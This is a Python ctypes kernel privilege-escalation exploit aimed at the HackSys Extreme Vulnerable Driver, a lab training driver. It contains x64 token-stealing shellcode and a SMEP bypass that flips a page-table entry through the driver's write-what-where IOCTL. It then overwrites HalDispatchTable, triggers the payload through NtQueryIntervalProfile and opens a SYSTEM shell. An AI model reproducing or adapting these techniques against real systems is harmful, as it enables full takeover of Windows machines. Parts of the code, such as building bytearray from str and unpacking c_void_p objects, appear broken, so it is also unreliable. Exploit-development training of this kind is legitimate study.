import struct
import sys
import os
from ctypes import *

# Required Windows DLLs
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Structures for PTE manipulation
class WriteWhatWhereStructure(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

def allocate_shellcode():
    """Allocates RWX memory and copies the token-stealing payload."""
    # Token stealing payload for Windows x64
    payload = bytearray(
        "\x65\x48\x8B\x04\x25\x88\x01\x00\x00"      # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
        "\x48\x8B\x80\xB8\x00\x00\x00"              # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
        "\x48\x89\xC3"                              # mov rbx,rax         ; Copy current process
        "\x48\x8B\x9B\xF0\x02\x00\x00"              # mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
        "\x48\x81\xEB\xF0\x02\x00\x00"              # sub rbx,0x2f0       ; Go back to current process
        "\x48\x8B\x8B\xE8\x02\x00\x00"              # mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
        "\x48\x83\xF9\x04"                          # cmp rcx,byte +0x4   ; Compare PID to SYSTEM
        "\x75\xE5"                                  # jnz loop            ; Loop until SYSTEM PID
        "\x48\x8B\x8B\x58\x03\x00\x00"              # mov rcx,[rbx+0x358] ; Get SYSTEM token
        "\x80\xE1\xF0"                              # and cl, 0xf0        ; Clear RefCnt
        "\x48\x89\x88\x58\x03\x00\x00"              # mov [rax+0x358],rcx ; Set current process token
        "\x48\x31\xC0"                              # xor rax,rax         ; NTSTATUS SUCCESS
        "\xC3"                                      # ret                 ; Return
    )
    
    print("[+] Allocating RWX region for shellcode")
    ptr = kernel32.VirtualAlloc(
        c_int(0),                    # lpAddress
        c_int(len(payload)),         # dwSize
        c_int(0x3000),              # flAllocationType
        c_int(0x40)                 # flProtect
    )
    
    # Copy shellcode to allocated memory
    c_type_buffer = (c_char * len(payload)).from_buffer(payload)
    print("[+] Copying shellcode to RWX region")
    kernel32.RtlMoveMemory(c_int(ptr), c_type_buffer, c_int(len(payload)))
    
    return ptr

def get_kernel_base():
    """Gets the base address of ntoskrnl.exe."""
    base = (c_ulonglong * 1024)()
    
    print("[+] Calling EnumDeviceDrivers()")
    if not psapi.EnumDeviceDrivers(byref(base), sizeof(base), byref(c_long())):
        print("[-] EnumDeviceDrivers() failed!")
        sys.exit(-1)
    
    return base[0]  # First entry is ntoskrnl.exe base

def exploit_smep_bypass(kernel_base, shellcode_ptr):
    """Main exploit routine to bypass SMEP and execute shellcode."""
    # Calculate required addresses
    nt_mi_get_pte_address = kernel_base + 0x51214
    pte_base = nt_mi_get_pte_address + 0x13
    haldispatchtable = kernel_base + 0x2f1330 + 0x8
    
    print(f"[+] nt!MiGetPteAddress: {hex(nt_mi_get_pte_address)}")
    print(f"[+] PTE base location: {hex(pte_base)}")
    print(f"[+] HalDispatchTable + 0x8: {hex(haldispatchtable)}")
    
    # Get handle to vulnerable driver
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        0xC0000000,                 # dwDesiredAccess
        0,                          # dwShareMode
        None,                       # lpSecurityAttributes
        0x3,                        # dwCreationDisposition
        0,                          # dwFlagsAndAttributes
        None                        # hTemplateFile
    )
    
    if handle == -1:
        print("[-] Failed to get driver handle!")
        sys.exit(-1)
    
    # Get base of PTEs
    base_of_ptes_pointer = c_void_p()
    www = WriteWhatWhereStructure()
    www.What = pte_base
    www.Where = addressof(base_of_ptes_pointer)
    
    # Trigger arbitrary write to get PTE base
    kernel32.DeviceIoControl(
        handle,
        0x0022200B,
        pointer(www),
        0x8,
        None,
        0,
        byref(c_ulong()),
        None
    )
    
    base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]
    print(f"[+] Base of PTEs: {hex(base_of_ptes)}")
    
    # Calculate shellcode's PTE address
    shellcode_pte = (shellcode_ptr >> 9) & 0x7ffffffff8
    shellcode_pte += base_of_ptes
    
    # Get current PTE control bits
    pte_bits_pointer = c_void_p()
    www.What = shellcode_pte
    www.Where = addressof(pte_bits_pointer)
    
    kernel32.DeviceIoControl(
        handle,
        0x0022200B,
        pointer(www),
        0x8,
        None,
        0,
        byref(c_ulong()),
        None
    )
    
    # Convert user PTE to kernel PTE
    pte_bits = struct.unpack('<Q', pte_bits_pointer)[0]
    kernel_pte_bits = pte_bits - 4  # Flip U/S bit
    
    # Overwrite PTE to make shellcode page kernel mode
    pte_overwrite = c_void_p(kernel_pte_bits)
    www.What = addressof(pte_overwrite)
    www.Where = shellcode_pte
    
    print("[+] Overwriting PTE to convert shellcode page to kernel mode")
    kernel32.DeviceIoControl(
        handle,
        0x0022200B,
        pointer(www),
        0x8,
        None,
        0,
        byref(c_ulong()),
        None
    )
    
    # Final stage: overwrite HalDispatchTable
    shellcode_ptr_obj = c_void_p(shellcode_ptr)
    www.What = addressof(shellcode_ptr_obj)
    www.Where = haldispatchtable
    
    print("[+] Overwriting HalDispatchTable")
    kernel32.DeviceIoControl(
        handle,
        0x0022200B,
        pointer(www),
        0x8,
        None,
        0,
        byref(c_ulong()),
        None
    )
    
    # Trigger shellcode execution
    print("[+] Triggering shellcode execution")
    ntdll.NtQueryIntervalProfile(0x1234, byref(c_ulonglong()))

def main():
    print("[+] Windows 10 RS1 Kernel Exploit (SMEP Bypass)")
    
    # Allocate and prepare shellcode
    shellcode_ptr = allocate_shellcode()
    print(f"[+] Shellcode allocated at: {hex(shellcode_ptr)}")
    
    # Get kernel base address
    kernel_base = get_kernel_base()
    print(f"[+] ntoskrnl.exe base: {hex(kernel_base)}")
    
    # Execute exploit
    exploit_smep_bypass(kernel_base, shellcode_ptr)
    
    # If successful, spawn SYSTEM shell
    print("[+] Exploit completed - spawning SYSTEM shell")
    os.system("cmd.exe /K cd C:\\")

if __name__ == "__main__":
    main()
